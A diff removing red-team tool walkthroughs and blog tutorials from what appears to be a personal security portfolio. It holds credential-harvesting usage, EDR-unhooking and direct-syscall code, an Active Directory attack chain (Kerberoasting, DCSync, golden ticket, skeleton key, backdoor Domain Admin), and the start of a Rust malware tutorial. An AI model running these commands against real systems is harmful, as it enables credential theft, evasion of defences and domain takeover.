-                { type: "tip", title: "Traffic Blending", body: "Wrap agent traffic in WebSocket over TLS (port 443) to blend with normal HTTPS traffic. Configure Nginx on the server side as a WebSocket reverse proxy." },
-                { type: "note", title: "Alternatives", body: "Mature alternatives include Ligolo-ng, Chisel, and SSF. NetGhost is primarily a learning project — Ligolo-ng is recommended for actual engagements until NetGhost reaches v1.0." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "CredVault - Credential Harvesting Suite",
-        tags: ["Python", "Windows", "Post-Exploitation"],
-        description: "Automated credential extraction from memory, registry, browsers, and various applications. Includes LSASS dumping, SAM extraction, and WiFi password recovery.",
-        status: "active",
-        walkthrough: {
-          tabs: ["Overview", "Modules", "Usage", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `CredVault is a post-exploitation credential harvesting toolkit written in Python. It aggregates multiple credential extraction techniques into a single tool with a clean interface and structured output.\n\nDesigned to run on a compromised Windows host, either interactively or as a headless script that drops a JSON results file.`,
-              tech: ["Python 3.10", "ctypes", "WinAPI", "SQLite", "dpapi-py"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "LSASS Memory Dump",
-                  desc: "Use comsvcs.dll MiniDump or a custom minidump approach to extract LSASS memory. Feed the dump to pypykatz locally or transfer to Mimikatz for parsing."
-                },
-                {
-                  title: "SAM & SYSTEM Hive Extraction",
-                  desc: "Pull the SAM and SYSTEM registry hives using reg.exe or Volume Shadow Copies. Extract local account NTLM hashes with Impacket's secretsdump."
-                },
-                {
-                  title: "Browser Credential Extraction",
-                  desc: "Decrypt Chrome, Edge, and Firefox saved passwords using DPAPI. Handles master password-protected Firefox profiles and Chromium AES-256 encryption."
-                },
-                {
-                  title: "WiFi Password Recovery",
-                  desc: "Extract saved WiFi profile credentials via netsh. Often yields domain credentials for offices with Active Directory-integrated wireless auth."
-                },
-                {
-                  title: "Windows Credential Manager",
-                  desc: "Enumerate and decrypt credentials stored in Windows Credential Manager (DPAPI-protected blobs). Frequently contains RDP, web, and generic credentials."
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Run all modules",
-                  desc: "Execute all harvesting modules and output structured JSON.",
-                  code: `<span class="prompt">C:\\></span> python credvault.py --all --output C:\\Temp\\creds.json\n\n<span class="comment">  [*] CredVault v1.4 | Starting harvest...</span>\n<span class="comment">  [+] LSASS dump: SUCCESS (dump at C:\\Temp\\lsass.dmp)</span>\n<span class="comment">  [+] SAM extraction: SUCCESS</span>\n<span class="comment">  [+] Chrome creds: 47 credentials found</span>\n<span class="comment">  [+] Firefox creds: 12 credentials found</span>\n<span class="comment">  [+] WiFi profiles: 8 profiles found</span>\n<span class="comment">  [+] Cred Manager: 6 entries found</span>\n<span class="comment">  [*] Results saved to C:\\Temp\\creds.json</span>`
-                },
-                {
-                  title: "Run a specific module",
-                  desc: "Target only browser credentials for a quieter extraction.",
-                  code: `<span class="prompt">C:\\></span> python credvault.py --module browsers --browser chrome\n\n<span class="comment">  URL                     USERNAME            PASSWORD</span>\n<span class="comment">  ----------------------  ------------------  ----------</span>\n<span class="comment">  https://mail.corp.com   jsmith@corp.com     P@ssw0rd123</span>\n<span class="comment">  https://vpn.corp.com    jsmith              Corp2024!</span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "warn", title: "Admin Required", body: "LSASS dumping and SAM extraction require SYSTEM or Administrator privileges. Browser and WiFi credential extraction works as the current user (no elevation needed)." },
-                { type: "tip", title: "LSASS Protection", body: "If RunAsPPL (Protected Process Light) is enabled on LSASS, standard memory dumps fail. Use a kernel driver approach or target VSS shadow copies of the SAM hive instead." },
-                { type: "note", title: "DPAPI", body: "Most Windows credential stores are DPAPI-protected. Decryption requires either the user's login password or the domain backup key (obtainable from a DC). If you have SYSTEM on the target machine, you can decrypt without the password." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "OpSec Analyzer - OPSEC Validation Tool",
-        tags: ["Python", "Detection", "Blue Team"],
-        description: "Automated tool for testing operational security of red team infrastructure, payloads, and techniques against common detection mechanisms and threat intelligence feeds.",
-        status: "in-progress",
-        walkthrough: {
-          tabs: ["Overview", "Checks", "Usage", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `OpSec Analyzer is a pre-engagement validation tool for red teamers. Before going live on an engagement, run your infrastructure, payloads, and planned techniques through a gauntlet of automated detection checks.\n\nStatus: core checks are operational. Threat intel feed integration is still being developed.`,
-              tech: ["Python 3", "Shodan API", "VirusTotal API", "URLscan.io", "Censys"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Infrastructure Fingerprinting Check",
-                  desc: "Checks your C2 server/redirector against Shodan, Censys, and GreyNoise to see if it's already flagged as malicious or associated with known threat actors."
-                },
-                {
-                  title: "Certificate Transparency Check",
-                  desc: "Ensures your C2 domain's TLS certificate isn't logged in CT logs in a way that reveals infrastructure relationships between your domains."
-                },
-                {
-                  title: "Payload Detection Rate",
-                  desc: "Submits a sanitized version of your payload to third-party scanning services and reports detection rate. Flags high-detection payloads before you use them."
-                },
-                {
-                  title: "Domain Category Check",
-                  desc: "Verifies your C2 domains are categorized as benign (e.g., 'Business', 'Technology') by common web filtering proxies. Uncategorized domains are often blocked by enterprise proxies."
-                },
-                {
-                  title: "C2 Profile Validation",
-                  desc: "Analyzes your C2 malleable profile / HTTP profile and flags headers or patterns that deviate from the impersonated legitimate service."
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Full infrastructure check",
-                  desc: "Run all checks against your C2 server before engagement start.",
-                  code: `<span class="prompt">$</span> python opsec_analyzer.py \\\n    --c2-ip 203.0.113.42 \\\n    --domains c2.legit-looking.com,api.legit-looking.com \\\n    --payload loader.exe\n\n<span class="comment">  [*] OpSec Analyzer v0.8 | Running checks...</span>\n<span class="comment">  [+] Shodan: IP not flagged</span>\n<span class="comment">  [+] GreyNoise: Not in threat feed</span>\n<span class="comment">  [+] Domain categories: Business/Technology ✓</span>\n<span class="comment">  [+] CT logs: No suspicious relationships</span>\n<span class="comment">  [!] Payload: 4/72 detections (review flagged engines)</span>\n<span class="comment">  [*] Overall OPSEC score: 87/100</span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "warn", title: "WIP", body: "This tool is under development. The threat intel feed integrations (MISP, OpenCTI) and automated remediation suggestions are not yet implemented." },
-                { type: "tip", title: "Before Every Engagement", body: "Make it a habit to run OpSec Analyzer before every engagement. Infrastructure that was clean last month might now be flagged if your IP space was used by another group." },
-                { type: "note", title: "API Keys", body: "Most checks require API keys for Shodan, VirusTotal, and Censys. Free tiers work for most checks but rate limits apply. Store keys in a .env file, never hardcode." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "Scraper Tool",
-        tags: ["Python", "Intelligence", "OSINT"],
-        description: "Automated tool for scraping the content of websites, dumps, and documents for threat intelligence purposes.",
-        status: "active",
-        walkthrough: {
-          tabs: ["Overview", "Checks", "Usage", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `My scraper is a tool for Threat Intellingence. Before going on an active engagement, run the Scraper on the Target to get the most info you can, so you can plan for the active engagement.\n\nStatus: core checks are operational. Threat intel feed integration is still being developed.`,
-              tech: ["Python 3", "Shodan API", "abuseipdb API", "Concurrent", "Ip-api"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Target Check",
-                  desc: "Checks your input against Shodan, Abuseipdb, and Ip-api to see if it's already flagged as associated with known threat actors."
-                },
-                {
-                  title: "Domain Category Check",
-                  desc: "Verifies your C2 domains are categorized as benign (e.g., 'Business', 'Technology') by common web filtering proxies. Uncategorized domains are often blocked by enterprise proxies."
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Full infrastructure check",
-                  desc: "Run all checks against your Target before engagement start.",
-                  code: `<span class="prompt">$</span> python scrape.py \\\n    203.0.113.42  \\\n <span class="comment">  [*] Scrape v0.8 | Running checks...</span>\n<span class="comment">  [+] Shodan: IP not flagged</span>\n<span class="comment">  [+] Abuseipdb: Not in threat feed</span>\n<span class="comment">  [+] Domain categories: Business/Technology ✓</span>\n<span class="comment"></span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "warn", title: "WIP", body: "This tool is under development. The threat intel feed integrations (MISP, OpenCTI) and automated remediation suggestions are not yet implemented." },
-                { type: "tip", title: "Before Every Engagement", body: "Make it a habit to run Scraper before every engagement. Infrastructure that was clean last month might now be flagged if your IP space was used by another group." },
-                { type: "note", title: "API Keys", body: "Most checks require API keys for Shodan, VirusTotal, and Censys. Free tiers work for most checks but rate limits apply. Store keys in a .env file, never hardcode." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "ExploitDB Scanner - Vulnerability Research",
-        tags: ["Python", "Exploits", "Research"],
-        description: "Automated vulnerability scanning and exploit matching tool. Indexes CVE databases, proof-of-concept exploits, and provides contextual information for discovered vulnerabilities.",
-        status: "archived",
-        walkthrough: {
-          tabs: ["Overview", "Usage", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `ExploitDB Scanner was an early research tool that cross-references discovered service versions against Exploit-DB, CVE databases, and local PoC repositories to flag exploitable vulnerabilities quickly.\n\nThis project is archived — superseded by better tools like nuclei, searchsploit, and commercial vulnerability management platforms. Kept as a reference and learning artifact.`,
-              tech: ["Python 3", "Nmap XML parsing", "ExploitDB API", "NVD API", "SQLite"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Scan + match exploits",
-                  desc: "Feed an nmap XML output into the scanner to get matched exploits.",
-                  code: `<span class="prompt">$</span> nmap -sV -oX scan.xml 10.10.10.0/24\n<span class="prompt">$</span> python exploitdb_scanner.py --nmap scan.xml\n\n<span class="comment">  HOST           PORT   SERVICE         CVE              SEVERITY  EXPLOIT</span>\n<span class="comment">  10.10.10.5     445    SMBv1           CVE-2017-0144    CRITICAL  EternalBlue</span>\n<span class="comment">  10.10.10.12    80     Apache 2.4.49   CVE-2021-41773   CRITICAL  Path Traversal PoC</span>\n<span class="comment">  10.10.10.20    21     vsftpd 2.3.4    CVE-2011-2523    HIGH      Backdoor PoC</span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "note", title: "Archived", body: "This project is no longer maintained. For vulnerability matching use searchsploit (offline ExploitDB) or nuclei with the exploit templates. For CVE enrichment use the NVD API directly." },
-                { type: "tip", title: "What I Learned", body: "Building this taught me how service fingerprinting works, how the NVD CVE scoring system is structured, and how to parse nmap output programmatically — all useful skills regardless of tool usage." }
-              ]
-            }
-          ]
-        }
-      }
-    ];
+    }
+  ];
 
     // Blog posts
     const BLOG_POSTS = [
-      {
-        title: "Advanced Evasion Techniques: Bypassing Modern EDR Solutions",
-        date: "2024-12-15",
-        tags: ["EDR", "Evasion", "Malware Dev"],
-        excerpt: "Deep dive into defeating endpoint detection and response systems using syscall direct invocation, unhooking techniques, and heaven's gate.",
-        readTime: "12 min",
-        walkthrough: {
-          tabs: ["Intro", "Unhooking", "Direct Syscalls", "Heaven's Gate", "Key Takeaways"],
-          content: [
-            {
-              type: "overview",
-              body: `Modern EDRs (Endpoint Detection & Response) hook userland API calls inside ntdll.dll to inspect what processes are doing. This post documents three core techniques for bypassing these hooks so your tooling can call the Windows kernel without EDR visibility.\n\nAll techniques were tested against a lab deployment of CrowdStrike Falcon and SentinelOne. Code samples are simplified for readability.`,
-              tech: ["C/C++", "Windows Internals", "x64 Assembly", "ntdll.dll", "PE Format"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "How EDR hooks work",
-                  desc: "When your process loads, the EDR injects a DLL that overwrites the first few bytes of sensitive ntdll.dll functions with a JMP to the EDR's inspection code. The EDR inspects arguments, decides if the call is malicious, then either blocks it or jumps to the real syscall.",
-                  code: `<span class="comment">; Normal ntdll!NtAllocateVirtualMemory (clean)</span>\n<span class="keyword">mov</span>    r10, rcx\n<span class="keyword">mov</span>    eax, 18h       <span class="comment">; syscall number</span>\n<span class="keyword">syscall</span>\n<span class="keyword">ret</span>\n\n<span class="comment">; Hooked by EDR — first bytes overwritten</span>\n<span class="keyword">jmp</span>    0x7FFE1234ABCD  <span class="comment">; → EDR inspection stub</span>\n<span class="keyword">nop</span>\n<span class="keyword">nop</span>`
-                },
-                {
-                  title: "Identifying hooked functions",
-                  desc: "You can detect hooks by reading the first bytes of ntdll exports at runtime and checking if they start with 0xE9 (JMP) instead of the expected MOV r10,rcx (0x4C 0x8B 0xD1).",
-                  code: `<span class="keyword">FARPROC</span> pFunc = GetProcAddress(\n    GetModuleHandleA(<span class="string">"ntdll.dll"</span>),\n    <span class="string">"NtAllocateVirtualMemory"</span>);\n\n<span class="keyword">BYTE</span> firstByte = *(<span class="keyword">BYTE</span>*)pFunc;\n<span class="keyword">if</span> (firstByte == <span class="string">0xE9</span>) {\n    printf(<span class="string">"[!] Function is HOOKED\\n"</span>);\n} <span class="keyword">else</span> {\n    printf(<span class="string">"[+] Function is CLEAN\\n"</span>);\n}`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Technique 1 — Overwrite hooks from a fresh ntdll copy",
-                  desc: "Load a second, clean copy of ntdll.dll directly from disk (bypassing the in-memory hooked version), then copy its .text section over the hooked one to restore all original bytes.",
-                  code: `<span class="comment">// Map a fresh ntdll from disk</span>\n<span class="keyword">HANDLE</span> hFile = CreateFileA(\n    <span class="string">"C:\\\\Windows\\\\System32\\\\ntdll.dll"</span>,\n    GENERIC_READ, FILE_SHARE_READ,\n    NULL, OPEN_EXISTING, 0, NULL);\n\n<span class="keyword">HANDLE</span> hMap = CreateFileMappingA(\n    hFile, NULL, PAGE_READONLY|SEC_IMAGE, 0, 0, NULL);\n<span class="keyword">LPVOID</span> pMap = MapViewOfFile(\n    hMap, FILE_MAP_READ, 0, 0, 0);\n\n<span class="comment">// Find .text section and overwrite hooked ntdll</span>\n<span class="comment">// (parse PE headers to locate .text, then memcpy)</span>`
-                },
-                {
-                  title: "Technique 2 — Patch only the specific hooked function",
-                  desc: "More surgical: detect which functions are hooked, then restore just those bytes by copying from a fresh ntdll mapping. Leaves the rest of the EDR's injection intact — less likely to cause crashes.",
-                  code: null
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "What are direct syscalls?",
-                  desc: "Instead of calling ntdll functions at all, you can invoke Windows kernel syscalls directly from your code using inline assembly. The EDR hook in ntdll is completely bypassed because you never call ntdll.",
-                  code: `<span class="comment">; Direct syscall stub for NtAllocateVirtualMemory</span>\n<span class="comment">; Syscall number (SSN) = 0x18 on Win10 21H2</span>\nNtAllocateVirtualMemory PROC\n    <span class="keyword">mov</span>    r10, rcx\n    <span class="keyword">mov</span>    eax, 18h\n    <span class="keyword">syscall</span>\n    <span class="keyword">ret</span>\nNtAllocateVirtualMemory ENDP`
-                },
-                {
-                  title: "The SSN problem — syscall numbers change between OS versions",
-                  desc: "Syscall numbers (SSNs) are not stable — they change between Windows versions and patches. Hard-coding them breaks on other machines. Solution: dynamically resolve SSNs at runtime by parsing a clean ntdll copy.",
-                  code: `<span class="comment">// SysWhispers3 approach — resolve SSN dynamically</span>\n<span class="comment">// 1. Map clean ntdll from disk (or KnownDlls)</span>\n<span class="comment">// 2. Walk export table to find target function</span>\n<span class="comment">// 3. Read the MOV EAX, XX instruction to extract SSN</span>\n<span class="comment">// 4. Patch that number into your syscall stub at runtime</span>\n\n<span class="keyword">DWORD</span> GetSSN(<span class="keyword">LPCSTR</span> funcName) {\n    <span class="keyword">BYTE</span>* pFunc = (<span class="keyword">BYTE</span>*)GetCleanExport(funcName);\n    <span class="comment">// MOV EAX, SSN is at offset +4 (after MOV R10,RCX)</span>\n    <span class="keyword">return</span> *(<span class="keyword">DWORD</span>*)(pFunc + 4);\n}`
-                },
-                {
-                  title: "SysWhispers3 — automate the whole thing",
-                  desc: "SysWhispers3 is a tool that auto-generates syscall stubs with dynamic SSN resolution, random stub names, and EGG-Hunter-based scrambling to avoid static signatures.",
-                  code: `<span class="prompt">$</span> <span class="cmd">python3 SysWhispers.py</span> \\\n    --preset common \\\n    --out-file syscalls \\\n    --method jumper-randomized\n\n<span class="comment">  [+] Generated: syscalls.h, syscalls.c, syscalls-asm.asm</span>\n<span class="comment">  [+] 25 functions with randomized stub names</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "What is Heaven's Gate?",
-                  desc: "Heaven's Gate lets a 32-bit process execute 64-bit code by switching the CPU from 32-bit (compatibility) mode to 64-bit (long) mode mid-execution. This is a technique for bypassing 32-bit EDR hooks when running inside a WOW64 process.",
-                  code: null
-                },
-                {
-                  title: "How it works — the far jump",
-                  desc: "WOW64 processes have access to 64-bit ntdll via a segment selector trick. A far JMP to CS selector 0x33 switches the CPU into 64-bit mode and lets you call 64-bit syscalls directly.",
-                  code: `<span class="comment">; 32-bit code — switch to 64-bit mode via Heaven's Gate</span>\n<span class="keyword">jmp</span>  FWORD PTR [heaven_gate]  <span class="comment">; far jump 0x33:addr</span>\n\nheavens_code:  <span class="comment">; now executing as 64-bit</span>\n    <span class="keyword">mov</span>  r10, rcx\n    <span class="keyword">mov</span>  eax, 18h\n    <span class="keyword">syscall</span>\n    <span class="keyword">retf</span>            <span class="comment">; return to 32-bit mode</span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "tip", title: "Which technique to use?", body: "Direct syscalls (SysWhispers3) are the most practical for general use. Unhooking is useful as a first step in a loader. Heaven's Gate is niche — only useful if you're specifically targeting 32-bit process contexts." },
-                { type: "warn", title: "Kernel callbacks still fire", body: "Even with all userland hooks bypassed, Windows kernel callbacks (PsSetCreateProcessNotifyRoutine, PsSetCreateThreadNotifyRoutine) still trigger inside the kernel. EDRs use these as a second detection layer — don't assume you're invisible." },
-                { type: "note", title: "Further Reading", body: "SysWhispers3 by klezVirus, Direct Syscalls by modexp, and the MDSec research on unhooking are the key references for this topic. Search 'Windows API unhooking red team' for the full body of work." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "Active Directory Exploitation: From Zero to Domain Admin",
-        date: "2024-11-28",
-        tags: ["Active Directory", "Red Team", "Privilege Escalation"],
-        excerpt: "Complete walkthrough of compromising a hardened Active Directory environment. Covers initial access, enumeration, Kerberoasting, golden ticket attacks, and persistence mechanisms.",
-        readTime: "18 min",
-        walkthrough: {
-          tabs: ["Intro", "Enumeration", "Kerberoasting", "Golden Ticket", "Persistence", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `This post walks through a full Active Directory attack chain from initial foothold to persistent Domain Admin access. The target environment had Defender enabled, LAPS deployed, and a reasonably hardened baseline — but several misconfigurations created a viable attack path.\n\nAll techniques were tested in a personal lab environment running Windows Server 2022 DC + Windows 11 workstations.`,
-              tech: ["BloodHound", "Rubeus", "Mimikatz", "Impacket", "PowerView", "CrackMapExec"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Domain enumeration with BloodHound",
-                  desc: "First order of business from any domain foothold: run SharpHound to collect AD data and import it into BloodHound for attack path analysis.",
-                  code: `<span class="prompt">PS C:\\></span> <span class="cmd">.\\ SharpHound.exe</span> -c All --zipfilename bh_data.zip\n<span class="comment">  [+] Status: 1241 objects finished (+1241) -- Using 47 MB RAM</span>\n<span class="comment">  [+] Enumeration finished in 00:01:43</span>\n<span class="comment">  [+] Compressing data to bh_data.zip</span>\n\n<span class="comment"># In BloodHound GUI — run these queries:</span>\n<span class="comment"># "Shortest Paths to Domain Admin"</span>\n<span class="comment"># "Principals with DCSync Rights"</span>\n<span class="comment"># "Find AS-REP Roastable Users"</span>`
-                },
-                {
-                  title: "Enumerate with PowerView",
-                  desc: "PowerView gives you fine-grained AD enumeration from the command line — useful for following up on BloodHound leads.",
-                  code: `<span class="prompt">PS C:\\></span> <span class="cmd">Get-DomainUser</span> -AdminCount 1 | select name, memberof\n<span class="prompt">PS C:\\></span> <span class="cmd">Get-DomainGroupMember</span> "Domain Admins" -Recurse\n<span class="prompt">PS C:\\></span> <span class="cmd">Find-LocalAdminAccess</span>  <span class="comment"># where are we local admin?</span>\n<span class="prompt">PS C:\\></span> <span class="cmd">Get-DomainTrust</span>       <span class="comment"># any trusts to abuse?</span>`
-                },
-                {
-                  title: "ACL / DACL analysis",
-                  desc: "BloodHound's ACL analysis often surfaces the best paths. Key rights to look for: GenericAll, GenericWrite, WriteDACL, AllExtendedRights, AddMember on privileged groups.",
-                  code: `<span class="prompt">PS C:\\></span> <span class="cmd">Find-InterestingDomainAcl</span> -ResolveGUIDs |\n    select ObjectDN, ActiveDirectoryRights, IdentityReference |\n    <span class="cmd">Where-Object</span> { $_.IdentityReference -like <span class="string">"*jsmith*"</span> }\n<span class="comment">  ObjectDN: CN=svc_backup,OU=Services,...   WriteDACL</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Identify Kerberoastable accounts",
-                  desc: "Service accounts with SPNs set can have their TGS tickets requested by any domain user, then cracked offline. Accounts with weak or old passwords are the target.",
-                  code: `<span class="prompt">PS C:\\></span> <span class="cmd">Get-DomainUser</span> -SPN | select name, serviceprincipalname, pwdlastset\n<span class="comment">  svc_sql     MSSQLSvc/sql01.corp.local    2019-03-14</span>\n<span class="comment">  svc_backup  BackupSvc/backup01.corp.local 2018-11-02  ← old!</span>`
-                },
-                {
-                  title: "Request TGS tickets with Rubeus",
-                  desc: "Use Rubeus to request and export TGS tickets for all Kerberoastable accounts in a cracking-ready format.",
-                  code: `<span class="prompt">PS C:\\></span> <span class="cmd">.\\ Rubeus.exe</span> kerberoast /nowrap /outfile:hashes.txt\n<span class="comment">  [*] Total kerberoastable users: 4</span>\n<span class="comment">  [*] Hash written to hashes.txt</span>\n\n<span class="comment"># Crack with hashcat on attacker box</span>\n<span class="prompt">$</span> <span class="cmd">hashcat</span> -m 13100 hashes.txt rockyou.txt \\\n    -r rules/best64.rule --force\n<span class="comment">  svc_backup:Summer2019!  → CRACKED</span>`
-                },
-                {
-                  title: "Verify and use cracked credentials",
-                  desc: "Test cracked creds immediately and check what access the account has.",
-                  code: `<span class="prompt">$</span> <span class="cmd">crackmapexec</span> smb dc01.corp.local \\\n    -u svc_backup -p <span class="string">'Summer2019!'</span>\n<span class="comment">  SMB  dc01.corp.local  445  DC01  [+] CORP\\svc_backup:Summer2019! (Pwn3d!)</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "DCSync to extract the krbtgt hash",
-                  desc: "From an account with DCSync rights (Domain Admin, or a delegated account), request the krbtgt NTLM hash — the key ingredient for forging Golden Tickets.",
-                  code: `<span class="comment"># With Mimikatz (on-box)</span>\nmimikatz # <span class="cmd">lsadump::dcsync</span> /domain:corp.local /user:krbtgt\n<span class="comment">  Hash NTLM: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d</span>\n\n<span class="comment"># With Impacket (remote, from Linux)</span>\n<span class="prompt">$</span> <span class="cmd">impacket-secretsdump</span> CORP/svc_backup:<span class="string">'Summer2019!'</span>@dc01.corp.local \\\n    -just-dc-user krbtgt`
-                },
-                {
-                  title: "Forge a Golden Ticket",
-                  desc: "A Golden Ticket is a forged Kerberos TGT using the krbtgt hash. It grants access to any resource in the domain as any user — and it remains valid even after password changes (until krbtgt is rotated twice).",
-                  code: `mimikatz # <span class="cmd">kerberos::golden</span> \\\n    /domain:corp.local \\\n    /sid:S-1-5-21-... \\\n    /krbtgt:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \\\n    /user:FakeAdmin \\\n    /id:500 \\\n    /ticket:golden.kirbi\n\n<span class="comment">  [+] Golden Ticket written to golden.kirbi</span>\n\nmimikatz # <span class="cmd">kerberos::ptt</span> golden.kirbi\n<span class="comment">  [+] Ticket injected into current session</span>`
-                },
-                {
-                  title: "Validate Golden Ticket access",
-                  desc: "Pass-the-Ticket into the current session, then verify you can reach the DC as the forged admin.",
-                  code: `<span class="prompt">C:\\></span> <span class="cmd">dir</span> \\\\dc01.corp.local\\C$\n<span class="comment">  Volume in drive \\\\dc01.corp.local\\C$ is Windows</span>\n<span class="comment">  [... DC filesystem accessible ...]</span>\n\n<span class="prompt">C:\\></span> <span class="cmd">psexec</span> \\\\dc01.corp.local cmd\n<span class="comment">  Microsoft Windows [Version 10.0.20348]</span>\n<span class="comment">  C:\\Windows\\system32> whoami</span>\n<span class="comment">  nt authority\\system</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Add a backdoor Domain Admin",
-                  desc: "Create a stealthy persistence account nested inside a non-obvious group that ultimately grants Domain Admin.",
-                  code: `<span class="prompt">PS C:\\></span> <span class="cmd">New-ADUser</span> -Name "svc_health" \\\n    -AccountPassword (ConvertTo-SecureString <span class="string">"H3alth$vc2024!"</span> -AsPlainText -Force) \\\n    -Enabled $true -PasswordNeverExpires $true\n<span class="prompt">PS C:\\></span> <span class="cmd">Add-ADGroupMember</span> "Domain Admins" -Members "svc_health"`
-                },
-                {
-                  title: "Skeleton Key (in-memory DC backdoor)",
-                  desc: "Mimikatz's skeleton key patches LSASS on the DC to accept a master password for any account — without changing actual passwords. Survives only until DC reboot.",
-                  code: `mimikatz # <span class="cmd">misc::skeleton</span>\n<span class="comment">  [+] Skeleton key patched on: DC01</span>\n<span class="comment">  [*] All accounts now accept password: mimikatz</span>\n\n<span class="comment"># Authenticate as any user with the skeleton key</span>\n<span class="prompt">$</span> <span class="cmd">net use</span> \\\\dc01.corp.local\\C$ /user:CORP\\Administrator mimikatz`
-                },
-                {
-                  title: "AdminSDHolder abuse for persistent DA",
-                  desc: "Modify the AdminSDHolder object's ACL to grant your backdoor account Full Control. SDProp runs every 60 minutes and propagates this to all protected groups — including Domain Admins.",
-                  code: `<span class="prompt">PS C:\\></span> <span class="cmd">Add-DomainObjectAcl</span> \\\n    -TargetIdentity <span class="string">"CN=AdminSDHolder,CN=System,DC=corp,DC=local"</span> \\\n    -PrincipalIdentity svc_health \\\n    -Rights All\n<span class="comment">  [+] ACL added — DA access restored every 60 min by SDProp</span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "warn", title: "Detection", body: "Golden Ticket use generates EventID 4769 (TGS Request) with unusual encryption type (0x17 = RC4 instead of AES). Monitor for Kerberos ticket lifetimes exceeding policy (Golden Tickets default to 10 years). DCSync triggers EventID 4662." },
-                { type: "tip", title: "Prioritize Kerberoasting targets", body: "Focus on service accounts with SPNs that haven't had password changes in 2+ years. Crack time with a GPU and rockyou+rules is often under an hour for weak passwords. Accounts with AES-only encryption set are harder to roast — target RC4 downgrade opportunities." },
-                { type: "note", title: "Lab Setup", body: "To practice this yourself: GOAD (Game of Active Directory) by Orange-Cyberdefense is the best free lab for AD attack practice. It deploys a full multi-domain environment with intentional vulnerabilities via Vagrant." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "Building Undetectable Malware with Rust",
-        date: "2024-10-10",
-        tags: ["Rust", "Malware", "Development"],
-        excerpt: "Tutorial on leveraging Rust's memory safety and low-level capabilities for malware development. Covers shellcode execution, process injection, and achieving low detection rates.",
-        readTime: "15 min",
-        walkthrough: {
-          tabs: ["Intro", "Why Rust?", "Shellcode Runner", "Process Injection", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `This post explores using Rust for offensive tool development. Rust's lack of a garbage collector, direct memory control, and minimal runtime make it attractive for malware — the resulting binaries are lean, fast, and harder to reverse engineer than C# or Python equivalents.\n\nAll code is for educational/lab use. Tested on Windows 11 23H2 with Windows Defender enabled.`,
-              tech: ["Rust", "winapi crate", "ntapi crate", "cargo", "LLVM"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Smaller attack surface vs C#",
-                  desc: "C# binaries ship with a large, well-understood .NET runtime that EDRs know intimately. Rust compiles to native machine code with no managed runtime — EDRs have far less behavioral baseline to compare against."
-                },
-                {
-                  title: "No garbage collector = predictable memory layout",
-                  desc: "Rust's ownership model gives you C-like memory control without the footguns. You can precisely control when memory is allocated and zeroed — important for shellcode staging."
-                },
-                {
-                  title: "Fewer Rust malware signatures (for now)",
-                  desc: "AV vendors have years of signatures for common C/C++ and C# malware patterns. Rust is newer in the offensive space — fewer pre-existing signatures in the wild, though this gap is closing."
-                },
-                {
-                  title: "Cross-compile from Linux",
-                  desc: "Targeting Windows from a Linux dev box is straightforward with Rust's cross-compilation support.",
-                  code: `<span class="prompt">$</span> <span class="cmd">rustup target add</span> x86_64-pc-windows-gnu\n<span class="prompt">$</span> <span class="cmd">cargo build</span> --target x86_64-pc-windows-gnu --release\n<span class="comment">  Compiling myloader v0.1.0</span>\n<span class="comment">  Finished release [optimized] target(s) in 8.42s</span>`
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Basic shellcode runner",
-                  desc: "Allocate RWX memory, copy shellcode into it, and create a thread to execute it. Simple, noisy — good baseline before adding evasion.",
